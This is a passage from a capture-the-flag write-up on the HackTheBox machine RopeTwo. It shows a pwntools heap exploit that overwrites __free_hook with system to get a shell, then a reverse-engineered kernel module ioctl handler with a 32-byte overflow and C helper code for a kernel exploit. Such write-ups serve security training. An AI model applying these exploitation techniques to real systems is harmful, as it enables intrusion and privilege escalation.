</span></span><span class="line"><span class="cl">        <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;LEAK:   0x</span><span class="si">%x</span><span class="s2">&#34;</span> <span class="o">%</span><span class="p">(</span><span class="n">leak</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">leak</span> <span class="o">+</span> <span class="mh">0x197f000</span> <span class="c1">#0x1b2634</span>
</span></span><span class="line"><span class="cl">        <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;LIBC:   0x</span><span class="si">%x</span><span class="s2">&#34;</span> <span class="o">%</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;LIBC:   0x</span><span class="si">%x</span><span class="s2">&#34;</span> <span class="o">%</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;__free_hook:   0x</span><span class="si">%x</span><span class="s2">&#34;</span> <span class="o">%</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;__free_hook&#39;</span><span class="p">]))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;&#34;</span><span class="p">)</span> <span class="c1"># Fix the buffer of thr program</span>
</span></span></code></pre></div><p>Now, what we do is, allocate at the chunk 1 with size <code>0x70</code> and then <code>free</code> it with the use of the <code>realloc</code>, this will push the chunk on the <code>tcache</code> bin list, now we again reallocate the same chunk by shrinking it&rsquo;s size to the <code>0x18</code>, then we allocate the chunk of the same size earlier and edit the <code>fd</code> of the next adjacent chunk to the <code>__free_hook - 0x8</code> and made the size to the <code>0x41</code> which will make it belong to bin of size <code>0x50</code>. Then we <code>free</code> the chunk 1.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="n">allocate</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">,</span> <span class="s2">&#34;F&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">realloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">realloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">,</span> <span class="s2">&#34;F&#34;</span><span class="o">*</span><span class="mh">0x10</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">allocate</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;F&#34;</span><span class="o">*</span><span class="mh">0x18</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x41</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s2">&#34;__free_hook&#34;</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x8</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span></code></pre></div><p>






  
  
<figure><img src="/img/ropetwo/free_hook.png" alt="" class="mx-auto my-0 rounded-md" />
</figure>
</p>
<p>Now, we retrieve the chunk and overwrite the <code>free_hook</code> with the system:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="n">allocate</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">,</span> <span class="s2">&#34;G&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">realloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x28</span><span class="p">,</span> <span class="s2">&#34;G&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">allocate</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;/bin/sh</span><span class="se">\x00</span><span class="s2">&#34;</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]))</span>
</span></span></code></pre></div><p>






  
  
<figure><img src="/img/ropetwo/system.png" alt="" class="mx-auto my-0 rounded-md" />
</figure>
</p>
<p>Now, we invoke the <code>__free_hook</code> by calling the <code>rm</code> function:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;$ &#34;</span><span class="p">,</span> <span class="s2">&#34;rm 1&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></div><p>






  
  
<figure><img src="/img/ropetwo/shell.png" alt="" class="mx-auto my-0 rounded-md" />
</figure>
</p>
<p>The final script for the remote server can be found <a href="https://github.com/D4mianWayne/PwnLand/tree/master/CTFs/RopeTwo_HackTheBox/User" target="_blank" rel="noreferrer">here</a></p>
<p>Running the remote exploit, since ASLR was enabled on the server, we have to bruteforce the last 4 bytes of the <code>_IO_2_1_stdout_</code>, in my case I had the issue with the LIBC leak, with the help of the <a href="https://willsroot.io" target="_blank" rel="noreferrer">FizzBuzz</a>, using the last bytes as <code>p16(0x2760)</code>, doing that so and running the exploit in <code>while</code> loop, I got the shell with 40-60 tries:-</p>
<blockquote>
<p>Issue, after getting the shell as the user <code>r4j</code>, I couldn&rsquo;t read the <code>user.txt</code> which was because of the groups I belonged, using the <code>newgrp</code> and leveraging to the <code>r4j</code> group, I was able to read the user flag.</p>
</blockquote>
<p>






  
  
<figure><img src="/img/ropetwo/user.png" alt="" class="mx-auto my-0 rounded-md" />
</figure>
</p>
<h1 id="root" class="relative group">Root <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#root" aria-label="Anchor">#</a></span></h1><p>Now, being the user <code>r4j</code> didn&rsquo;t really gave much away with basic enumeration and as I knew that the fact of the root part being the kernel, I went in and checked for the <code>/dev/</code> to look for any suspicious driver, in this case the only thing that stood out more than the other was, <code>ralloc</code>.</p>
<blockquote>
<p>Attachment: The files for root exploitation can be found <a href="https://github.com/D4mianWayne/PwnLand/tree/master/CTFs/RopeTwo_HackTheBox/Root" target="_blank" rel="noreferrer">here</a>.</p>
</blockquote>
<p>One way I found about the <code>ralloc</code> custom LKM was with the help of <code>dmesg</code>, which showed the follwing message:-</p>
<p>






  
  
<figure><img src="/img/ropetwo/dmesg.png" alt="" class="mx-auto my-0 rounded-md" />
</figure>
</p>
<p>Now, that showed, we have the <code>ralloc</code>, although to start off with the exploitation or even knowing the workflow of this module, I needed to get the <code>ralloc.ko</code>, doing <code>locate ralloc.ko</code>, the file was located at <code>/usr/lib/modules/5.0.0-38-generic/kernel/drivers/ralloc/ralloc.ko</code> which is the default path where kernel modules are stored. Then checking for the kernel version:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="n">Linux</span> <span class="n">rope2</span> <span class="mf">5.0.0</span><span class="o">-</span><span class="mi">38</span><span class="o">-</span><span class="n">generic</span> <span class="err">#</span><span class="mi">41</span><span class="o">-</span><span class="n">Ubuntu</span> <span class="n">SMP</span> <span class="n">Tue</span> <span class="n">Dec</span> <span class="mi">3</span> <span class="mo">00</span><span class="o">:</span><span class="mi">27</span><span class="o">:</span><span class="mi">35</span> <span class="n">UTC</span> <span class="mi">2019</span> <span class="n">x86_64</span> <span class="n">x86_64</span> <span class="n">x86_64</span> <span class="n">GNU</span><span class="o">/</span><span class="n">Linux</span>
</span></span></code></pre></div><h5 id="kernel-exploitation" class="relative group">Kernel Exploitation <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#kernel-exploitation" aria-label="Anchor">#</a></span></h5><p>There was no publically available CVE for this version of kernel, what left was to dissect the binary and try to understand the workflow and look for any vulnerable part. I am more fan of IDA than of Ghidra, but then again it&rsquo;s just personal preference, at the end you&rsquo;ll have the overall idea. So, moving on, let&rsquo;s reverse engineer the binary and see what the binary really does:-</p>
<p>Now, using the <code>IDA</code> and cleaning up the code a lot, there were 3 functions, in which the <code>rope2_ioctl</code> was one of the functions which was most interesting, the other 2 being <code>rope2_init</code> and <code>rope2_exit</code> are there to handle the intialization and exit operation for the modules, aside from those, the function we need to really focus on was the <code>rope2_ioctl</code> which was as follows:-</p>
<blockquote>
<p>The development of the exploit is done on the QEMU instance which can be foind at the above attached link.
KASLR has been off for the debugging purpose but it is enabled on the RopeTwo machine.
First off, there were four options one could invoke, which were as follows:-</p>
</blockquote>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl">    <span class="k">case</span> <span class="mh">0x1000</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">      <span class="n">heap</span><span class="p">.</span><span class="n">size</span> <span class="o">=</span> <span class="o">*&amp;</span><span class="n">request</span><span class="p">.</span><span class="n">size</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span> <span class="o">*&amp;</span><span class="n">request</span><span class="p">.</span><span class="n">size</span> <span class="o">&lt;=</span> <span class="mh">0x400uLL</span> <span class="o">&amp;&amp;</span> <span class="n">request</span><span class="p">.</span><span class="n">index</span> <span class="o">&lt;=</span> <span class="mh">0x1F</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">heap</span><span class="p">.</span><span class="n">chunk</span> <span class="o">=</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">arr</span> <span class="o">+</span> <span class="mi">16</span> <span class="o">*</span> <span class="n">request</span><span class="p">.</span><span class="n">index</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">heap</span><span class="p">.</span><span class="n">chunk</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="n">chunk</span> <span class="o">=</span> <span class="nf">_kmalloc</span><span class="p">(</span><span class="o">*&amp;</span><span class="n">request</span><span class="p">.</span><span class="n">size</span><span class="p">,</span> <span class="mh">0x6000C0LL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">          <span class="n">heap</span><span class="p">.</span><span class="n">chunk</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">chunk</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">          <span class="k">if</span> <span class="p">(</span> <span class="n">chunk</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">          <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="o">*</span><span class="n">heap</span><span class="p">.</span><span class="n">chunk</span> <span class="o">=</span> <span class="n">heap</span><span class="p">.</span><span class="n">size</span> <span class="o">+</span> <span class="mi">32</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="n">return_value</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">goto</span> <span class="n">exit</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">          <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="k">goto</span> <span class="n">jump_to_exit</span><span class="p">;</span>
</span></span></code></pre></div><p>The first option, here which can be invoked by giving the <code>0x1000</code> as option, which we will see later on how we will interact with it, here it takes the two options, <code>index</code> and the other being <code>size</code> on the basis of that, it will allocate the chunk on the kernel heap with the <code>kmalloc</code> and save it on the global array with the index given, the upmost <code>index</code> that we could allocate to is <code>0x1F</code> and accepted size is <code>&lt;= 0x400</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl">    <span class="k">case</span> <span class="mh">0x1001</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span> <span class="n">request</span><span class="p">.</span><span class="n">index</span> <span class="o">&lt;=</span> <span class="mh">0x1F</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">index</span> <span class="o">=</span> <span class="mi">2LL</span> <span class="o">*</span> <span class="n">request</span><span class="p">.</span><span class="n">index</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">array_1</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">arr</span> <span class="o">+</span> <span class="n">index</span> <span class="o">*</span> <span class="mi">8</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span> <span class="n">heap_list</span><span class="p">[</span><span class="n">index</span><span class="p">]</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="nf">kfree</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">          <span class="o">*</span><span class="p">(</span><span class="n">array_1</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">          <span class="n">return_value</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">          <span class="k">goto</span> <span class="n">exit</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="k">goto</span> <span class="n">jump_to_exit</span><span class="p">;</span>
</span></span></code></pre></div><p>The option <code>0x1001</code> here is used to invoke a function which only takes <code>index</code> as the option and then checks if the index exist or not, on the basis of that it calls <code>kfree</code> and release the allocated chunk.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl">    <span class="k">case</span> <span class="mh">0x1002</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">      <span class="n">heap2</span><span class="p">.</span><span class="n">chunk</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">buf</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span> <span class="n">request</span><span class="p">.</span><span class="n">index</span> <span class="o">&lt;=</span> <span class="mh">0x1F</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">heap1</span><span class="p">.</span><span class="n">index</span> <span class="o">=</span> <span class="mi">2LL</span> <span class="o">*</span> <span class="n">request</span><span class="p">.</span><span class="n">index</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">heap1</span><span class="p">.</span><span class="n">chunk</span> <span class="o">=</span> <span class="n">heap_list</span><span class="p">[</span><span class="n">heap1</span><span class="p">.</span><span class="n">index</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="n">heap1</span><span class="p">.</span><span class="n">size</span> <span class="o">=</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">arr</span> <span class="o">+</span> <span class="n">heap1</span><span class="p">.</span><span class="n">index</span> <span class="o">*</span> <span class="mi">8</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span> <span class="n">heap1</span><span class="p">.</span><span class="n">chunk</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="n">memcpy_size</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">size</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">          <span class="k">if</span> <span class="p">(</span> <span class="n">request</span><span class="p">.</span><span class="n">size</span> <span class="o">&lt;=</span> <span class="o">*</span><span class="n">heap1</span><span class="p">.</span><span class="n">size</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">buf</span> <span class="o">&amp;</span> <span class="mh">0xFFFF000000000000LL</span><span class="p">)</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">goto</span> <span class="n">memcpy_jump</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nl">jump_to_exit</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">      <span class="n">return_value</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1LL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="k">goto</span> <span class="n">exit</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span></code></pre></div><p>The option was used to write to an allocated region, it takes the <code>index</code>, the <code>size</code> and the pointer to the buffered region.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">choice</span> <span class="o">!=</span> <span class="mh">0x1003</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">goto</span> <span class="n">jump_to_exit</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">heap1</span><span class="p">.</span><span class="n">chunk</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">buf</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">request</span><span class="p">.</span><span class="n">index</span> <span class="o">&gt;</span> <span class="mh">0x1F</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">goto</span> <span class="n">jump_to_exit</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">heap2</span><span class="p">.</span><span class="n">index</span> <span class="o">=</span> <span class="mi">2LL</span> <span class="o">*</span> <span class="n">request</span><span class="p">.</span><span class="n">index</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">heap2</span><span class="p">.</span><span class="n">chunk</span> <span class="o">=</span> <span class="n">heap_list</span><span class="p">[</span><span class="n">heap2</span><span class="p">.</span><span class="n">index</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">  <span class="n">heap2</span><span class="p">.</span><span class="n">size</span> <span class="o">=</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">arr</span> <span class="o">+</span> <span class="n">heap2</span><span class="p">.</span><span class="n">index</span> <span class="o">*</span> <span class="mi">8</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">heap2</span><span class="p">.</span><span class="n">chunk</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">goto</span> <span class="n">jump_to_exit</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">memcpy_size</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">size</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="o">*</span><span class="n">heap2</span><span class="p">.</span><span class="n">size</span> <span class="o">&lt;</span> <span class="n">request</span><span class="p">.</span><span class="n">size</span> <span class="o">||</span> <span class="n">request</span><span class="p">.</span><span class="n">buf</span> <span class="o">&amp;</span> <span class="mh">0xFFFF000000000000LL</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">goto</span> <span class="n">jump_to_exit</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nl">memcpy_jump</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">  <span class="nf">memcpy</span><span class="p">(</span><span class="n">heap1</span><span class="p">.</span><span class="n">chunk</span><span class="p">,</span> <span class="n">heap2</span><span class="p">.</span><span class="n">chunk</span><span class="p">,</span> <span class="n">memcpy_size</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">return_value</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nl">exit</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">  <span class="nf">mutex_unlock</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lock</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">return_value</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>This function was used to interact in order to read from the allocated region, this takes the <code>index</code>, <code>size</code> and the pointer to the buffer where the contents from the allocated region will be copied, this pointer would from the userland region.</p>
<p>Summarsing the code, we conclude it to:-</p>
<ul>
<li><code>0x1000</code>: Allocate function which takes <code>index</code> and <code>size</code>.</li>
<li><code>0x1001</code>: Free function which takes the <code>index</code>.</li>
<li><code>0x1002</code>: Write function which takes the <code>index</code> <code>size</code> and <code>data</code> to be written.</li>
<li><code>0x1003</code>: Read function which takes <code>index</code>, <code>size</code> and the <code>data</code> where the contents of the chunk would be read.</li>
<li>We can only allocate chunks upto to <code>0x1F</code> times.</li>
</ul>
<p>So, where does the vulnerabilit exists? It exists in the function <code>0x1000</code> which is used for allocation, now let&rsquo;s see where it was:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl">         <span class="n">chunk</span> <span class="o">=</span> <span class="nf">_kmalloc</span><span class="p">(</span><span class="o">*&amp;</span><span class="n">request</span><span class="p">.</span><span class="n">size</span><span class="p">,</span> <span class="mh">0x6000C0LL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">          <span class="n">heap</span><span class="p">.</span><span class="n">chunk</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">chunk</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">          <span class="k">if</span> <span class="p">(</span> <span class="n">chunk</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">          <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="o">*</span><span class="n">heap</span><span class="p">.</span><span class="n">chunk</span> <span class="o">=</span> <span class="n">heap</span><span class="p">.</span><span class="n">size</span> <span class="o">+</span> <span class="mi">32</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="n">return_value</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">goto</span> <span class="n">exit</span><span class="p">;</span>
</span></span></code></pre></div><p>The structure of the <code>heap</code> can be considered as:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">heap</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">size</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>  <span class="c1">// This is not accurate, it&#39;s here just for the explaination
</span></span></span></code></pre></div><p>If you pay close attention to the <code>heap.size + 32</code>, well considering how the <code>heap</code> structure here is, there&rsquo;s an extra 32 bytes added to it. This in turn, allowed us to write 32 bytes more than size of an allocated chunk, same as for read, we can read extra 32 bytes than the chunk&rsquo;s actual size.
So, conlcuding, we have <strong>32</strong> byte extra overflow for read/write. Now, the question arises, how exactly we interact with the service, to do so, I used <code>ioctl</code> to interact with it, the following functions I created:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">message</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">index</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">long</span> <span class="n">size</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">};</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">kmalloc</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">idx</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">size</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">struct</span> <span class="n">message</span> <span class="n">msg</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">msg</span><span class="p">.</span><span class="n">size</span> <span class="o">=</span> <span class="n">size</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">msg</span><span class="p">.</span><span class="n">index</span> <span class="o">=</span> <span class="n">idx</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[*] Allocating Chunk at: %ld of size: %ld</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">idx</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="nf">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">msg</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">   <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Error!!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">   <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">kfree</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">idx</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl"> <span class="k">struct</span> <span class="n">message</span> <span class="n">msg</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"> <span class="n">msg</span><span class="p">.</span><span class="n">index</span> <span class="o">=</span> <span class="n">idx</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"> <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[*] Free&#39;ng index: %ld</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">idx</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"> <span class="k">if</span> <span class="p">(</span><span class="nf">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mh">0x1001</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">msg</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Error!!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"> <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">fill</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">idx</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">size</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">ptr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl"> <span class="k">struct</span> <span class="n">message</span> <span class="n">msg</span><span class="p">;</span>
